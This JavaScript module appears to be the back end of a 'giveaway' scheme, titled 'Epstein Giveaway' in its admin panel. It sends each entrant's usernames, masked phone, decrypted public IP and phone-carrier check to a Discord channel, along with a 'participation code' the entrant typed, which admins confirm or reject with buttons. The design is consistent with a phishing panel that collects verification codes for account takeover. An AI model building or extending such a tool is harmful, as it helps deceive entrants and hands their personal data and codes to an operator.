import { decryptText } from "./security";

const DISCORD_API_BASE = "https://discord.com/api/v10";

function getDiscordToken() {
  return process.env.DISCORD_BOT_TOKEN || "";
}

function getDiscordChannelId() {
  return process.env.DISCORD_CHANNEL_ID || "";
}

function formatDate(value) {
  return new Intl.DateTimeFormat("fr-FR", {
    dateStyle: "medium",
    timeStyle: "short",
    timeZone: "Europe/Paris"
  }).format(new Date(value));
}

const STATUS_LABELS = {
  pending: "En attente",
  validated: "Validée",
  rejected: "Refusée"
};

const CODE_STATUS_LABELS = {
  pending: "Code en attente",
  confirmed: "Code confirmé",
  rejected: "Code refusé"
};

function valueOrDash(value) {
  return value ? String(value) : "-";
}

function publicIpFromEntry(entry) {
  if (entry.publicIp) {
    return entry.publicIp;
  }

  if (!entry.ipCipher) {
    return "Non disponible";
  }

  try {
    return decryptText(entry.ipCipher) || "Non disponible";
  } catch {
    return "Non disponible";
  }
}

function operatorFromEntry(entry) {
  const operator = entry.operatorVerification;

  if (!operator) {
    return "Non vérifié";
  }

  return [
    operator.carrier || "Opérateur inconnu",
    operator.countryName || "Pays inconnu",
    operator.lineType || "",
    operator.valid ? "numéro valide" : "numéro invalide"
  ].filter(Boolean).join(" · ");
}

function codeFromEntry(entry) {
  if (!entry.participantEnteredCode) {
    return "En attente";
  }

  const status = CODE_STATUS_LABELS[entry.participantCodeStatus] || "Code en attente";
  return `${entry.participantEnteredCode} · ${status}`;
}

function formatAdminDetails(entry) {
  return [
    `Cadeau: ${valueOrDash(entry.giftLabel)}`,
    `Pseudo: ${valueOrDash(entry.gamePseudo)}`,
    `Discord: ${valueOrDash(entry.discordPseudo)}`,
    `Téléphone: ${entry.maskedPhone || "Masqué"}`,
    `IP publique: ${publicIpFromEntry(entry)}`,
    `Statut: ${STATUS_LABELS[entry.status] || entry.status || "En attente"}`,
    `Raison: ${valueOrDash(entry.reviewReason)}`,
    `Opérateur: ${operatorFromEntry(entry)}`,
    `Code: ${codeFromEntry(entry)}`,
    `Date: ${formatDate(entry.createdAt || Date.now())}`
  ];
}

function actionRow(buttons) {
  return {
    type: 1,
    components: buttons
  };
}

function button(label, customId, style) {
  return {
    type: 2,
    label,
    style,
    custom_id: customId
  };
}

export async function notifyMessage(entry) {
  const channelId = getDiscordChannelId();

  if (!getDiscordToken() || !channelId) {
    return { skipped: true };
  }

  await sendDiscordMessage(channelId, {
    content: formatParticipationEntry(entry),
    components: [
      actionRow([
        button("Confirmer", `confirm:${entry.id}`, 3),
        button("Refuser", `reject:${entry.id}`, 4)
      ])
    ]
  });

  return { skipped: false };
}

export async function notifyMessageCode(entry) {
  const channelId = getDiscordChannelId();

  if (!getDiscordToken() || !channelId) {
    return { skipped: true };
  }

  await sendDiscordMessage(channelId, {
    content: formatCodeEntry(entry),
    components: [
      actionRow([
        button("Confirmer le code", `code_confirm:${entry.id}`, 3),
        button("Refuser le code", `code_reject:${entry.id}`, 4)
      ])
    ]
  });

  return { skipped: false };
}

export async function sendMessageAdminPanel(channelId, participations) {
  const pendingEntries = participations.filter((entry) => entry.status === "pending");
  const pendingCodes = participations.filter(
    (entry) => entry.participantEnteredCode && entry.participantCodeStatus === "pending"
  );

  await sendDiscordMessage(channelId || getDiscordChannelId(), {
    content: [
      "**Panel admin - Epstein Giveaway**",
      "",
      `Inscriptions: ${participations.length}`,
      `A valider: ${pendingEntries.length}`,
      `Codes à confirmer: ${pendingCodes.length}`
    ].join("\n"),
    components: [
      actionRow([
        button("Inscriptions", "panel_entries", 2),
        button("Codes", "panel_codes", 2),
        button("Actualiser", "panel", 1)
      ])
    ]
  });
}

export async function sendMessagePendingEntries(channelId, participations) {
  const pendingEntries = participations
    .filter((entry) => entry.status === "pending")
    .slice(0, 10);

  if (pendingEntries.length === 0) {
    await sendDiscordMessage(channelId || getDiscordChannelId(), {
      content: "Aucune inscription en attente."
    });
    return;
  }

  for (const entry of pendingEntries) {
    await sendDiscordMessage(channelId || getDiscordChannelId(), {
      content: formatParticipationEntry(entry),
      components: [
        actionRow([
          button("Confirmer", `confirm:${entry.id}`, 3),
          button("Refuser", `reject:${entry.id}`, 4)
        ])
      ]
    });
  }
}

export async function sendMessagePendingCodes(channelId, participations) {
  const pendingCodes = participations
    .filter((entry) => entry.participantEnteredCode && entry.participantCodeStatus === "pending")
    .slice(0, 10);

  if (pendingCodes.length === 0) {
    await sendDiscordMessage(channelId || getDiscordChannelId(), {
      content: "Aucun code en attente."
    });
    return;
  }

  for (const entry of pendingCodes) {
    await sendDiscordMessage(channelId || getDiscordChannelId(), {
      content: formatCodeEntry(entry),
      components: [
        actionRow([
          button("Confirmer le code", `code_confirm:${entry.id}`, 3),
          button("Refuser le code", `code_reject:${entry.id}`, 4)
        ])
      ]
    });
  }
}

export async function sendDiscordMessage(channelId, payload) {
  const token = getDiscordToken();

  if (!token || !channelId) {
    return;
  }

  const response = await fetch(`${DISCORD_API_BASE}/channels/${channelId}/messages`, {
    method: "POST",
    headers: {
      Authorization: `Bot ${token}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      allowed_mentions: { parse: [] },
      ...payload
    })
  });

  if (!response.ok) {
    const body = await response.json().catch(() => null);
    const description = body?.message || JSON.stringify(body);
    throw new Error(`Discord message failed: ${response.status} ${description}`);
  }
}

export function formatParticipationEntry(entry) {
  return [
    "**Nouvelle inscription**",
    "",
    ...formatAdminDetails(entry),
    "",
    "Statut: en attente"
  ].join("\n");
}

export function formatCodeEntry(entry) {
  return [
    "**Code de participation saisi**",
    "",
    ...formatAdminDetails(entry),
    `Date du code: ${formatDate(entry.participantCodeConfirmedAt || Date.now())}`,
    "",
    "Statut du code: en attente"
  ].join("\n");
}

export function finalActionComponents(label, style = 2) {
  return [
    actionRow([
      {
        type: 2,
        label,
        style,
        custom_id: "done",
        disabled: true
      }
    ])
  ];
}
